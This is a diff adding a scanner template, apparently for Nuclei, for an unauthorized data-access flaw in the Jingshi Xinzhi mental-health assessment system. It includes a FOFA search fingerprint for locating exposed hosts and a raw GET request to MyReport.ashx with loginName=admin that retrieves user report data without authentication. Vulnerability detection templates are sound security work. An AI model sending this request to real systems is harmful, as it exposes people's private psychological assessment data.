@@ -1,0 +1,26 @@
+id: jingshixinzhi-info-leak
+
+info:
+  name: "京师心智心理健康测评系 PersonalReport 未授权数据访问漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: body="JS/ligerComboBox/ligerTree.js"
+      《京师心智心理测评健康管理系统》由京师心智与北京师范大学心理学院联合研发，旨在提供专业心理测评服务。该系统因访问控制机制缺陷，导致敏感数据可被未授权用户直接获取，存在用户隐私泄露风险。
+  tags: 京师心智心理健康测评系
+
+http:
+- raw:
+  - |
+    GET /FunctionModular/PersonalReport/Ajax/MyReport.ashx?type=3&loginName=admin HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+    Connection: close
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - '_u_loginname'
